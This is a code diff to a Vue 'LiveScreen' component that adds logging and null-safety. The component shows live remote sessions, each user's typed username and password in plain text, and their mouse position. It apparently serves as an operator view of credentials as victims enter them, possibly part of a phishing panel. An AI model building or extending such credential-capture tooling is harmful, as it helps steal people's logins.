@@ -8,21 +8,26 @@ const sessions = computed(() => socketStore.liveSessions)
 
 watch(sessions, (newSessions) => {
   const sessionIds = Object.keys(newSessions)
+  console.log('[LiveScreen] Sessions watch triggered, session IDs:', sessionIds)
   
   if (sessionIds.length > 0) {
     if (!activeSession.value || !newSessions[activeSession.value]) {
       activeSession.value = sessionIds[0]
+      console.log('[LiveScreen] Set active session to:', activeSession.value)
     }
   } else {
     activeSession.value = null
+    console.log('[LiveScreen] No sessions available')
   }
 }, { immediate: true, deep: true })
 
 onMounted(() => {
   console.log('[LiveScreen] Component mounted')
+  console.log('[LiveScreen] Sessions from store:', Object.keys(sessions.value))
   const sessionIds = Object.keys(sessions.value)
   if (sessionIds.length > 0 && !activeSession.value) {
     activeSession.value = sessionIds[0]
+    console.log('[LiveScreen] Initialized active session to:', activeSession.value)
   }
 })
 </script>
@@ -55,7 +60,7 @@ onMounted(() => {
           <div class="form-group mb-3">
             <label class="block mb-1 text-xs text-gray-700">Username:</label>
             <input 
-              :value="sessions[activeSession].fields.username"
+              :value="sessions[activeSession].fields?.username || ''"
               placeholder="Enter your username"
               class="w-full px-3 py-1.5 border-2 border-[#5fbfbb] rounded text-sm"
               readonly
@@ -65,7 +70,7 @@ onMounted(() => {
           <div class="form-group mb-3">
             <label class="block mb-1 text-xs text-gray-700">Password:</label>
             <input 
-              :value="sessions[activeSession].fields.password"
+              :value="sessions[activeSession].fields?.password || ''"
               type="text"
               placeholder="Enter your password"
               class="w-full px-3 py-1.5 border-2 border-[#5fbfbb] rounded text-sm"
@@ -84,11 +89,11 @@ onMounted(() => {
       
       <!-- Mouse cursor overlay -->
       <div 
-        v-if="sessions[activeSession].mouseX > 0 || sessions[activeSession].mouseY > 0"
+        v-if="(sessions[activeSession].mouseX || 0) > 0 || (sessions[activeSession].mouseY || 0) > 0"
         class="absolute w-3 h-3 bg-red-500 rounded-full pointer-events-none transform -translate-x-1/2 -translate-y-1/2 z-50"
         :style="{
-          left: (sessions[activeSession].mouseX * 6) + 'px',
-          top: (sessions[activeSession].mouseY * 4.5) + 'px',
+          left: ((sessions[activeSession].mouseX || 0) * 6) + 'px',
+          top: ((sessions[activeSession].mouseY || 0) * 4.5) + 'px',
           transition: 'left 50ms linear, top 50ms linear'
         }"
       >
